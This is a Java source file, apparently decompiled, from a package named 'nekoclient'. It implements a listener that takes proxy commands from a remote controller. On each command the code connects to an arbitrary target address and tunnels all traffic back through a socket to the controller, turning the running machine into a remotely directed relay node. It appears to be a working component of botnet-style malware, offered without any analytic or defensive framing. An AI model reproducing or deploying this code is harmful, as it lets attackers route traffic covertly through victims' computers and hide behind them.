package dev.neko.nekoclient.packet.listener.impl;

import dev.neko.nekoclient.Client;
import dev.neko.nekoclient.api.proxy.ProxyResponse;
import dev.neko.nekoclient.packet.impl.client.ProxyResponsePacket;
import dev.neko.nekoclient.packet.impl.server.ProxyPacket;
import dev.neko.nekoclient.packet.listener.PacketListener;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ConnectException;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.net.UnknownHostException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ProxyPacketListener implements PacketListener<ProxyPacket> {
   public void call(ProxyPacket packet, Client client, String id) throws IOException {
      Socket clientConnection = new Socket();

      try {
         clientConnection.connect(packet.getAddress(), 5000);
         client.send(new ProxyResponsePacket(packet.getNonce(), ProxyResponse.CONNECTED));
         ExecutorService service = Executors.newFixedThreadPool(2);
         service.execute(() -> {
            try {
               Socket serverConnection = new Socket(client.getAddress().getAddress().getHostAddress(), packet.getAcceptorPort());
               DataOutputStream dataOutputStream = new DataOutputStream(serverConnection.getOutputStream());
               dataOutputStream.writeUTF(packet.getNonce());
               service.execute(() -> {
                  while(!service.isShutdown() && clientConnection.isConnected() && serverConnection.isConnected()) {
                     try {
                        clientConnection.getOutputStream().write(serverConnection.getInputStream().read());
                        if (serverConnection.getInputStream().available() > 0) {
                           byte[] ignoredx = new byte[serverConnection.getInputStream().available()];
                           serverConnection.getInputStream().read(ignoredx);
                           clientConnection.getOutputStream().write(ignoredx);
                        }
                     } catch (IOException var4x) {
                        service.shutdownNow();
                        return;
                     }
                  }
               });

               while(!service.isShutdown() && clientConnection.isConnected() && serverConnection.isConnected()) {
                  try {
                     serverConnection.getOutputStream().write(clientConnection.getInputStream().read());
                     if (clientConnection.getInputStream().available() > 0) {
                        byte[] bytes = new byte[clientConnection.getInputStream().available()];
                        clientConnection.getInputStream().read(bytes);
                        serverConnection.getOutputStream().write(bytes);
                     }
                  } catch (IOException var7x) {
                     service.shutdownNow();
                     return;
                  }
               }
            } catch (IOException var8x) {
            }
         });
      } catch (SocketTimeoutException var6) {
         client.send(new ProxyResponsePacket(packet.getNonce(), ProxyResponse.TIMED_OUT));
      } catch (UnknownHostException var7) {
         client.send(new ProxyResponsePacket(packet.getNonce(), ProxyResponse.UNKNOWN_HOST));
      } catch (ConnectException var8) {
         client.send(new ProxyResponsePacket(packet.getNonce(), ProxyResponse.CONNECTION_REFUSED));
      } catch (IOException var9) {
         client.send(new ProxyResponsePacket(packet.getNonce(), ProxyResponse.UNKNOWN_ERROR));
      }
   }
}
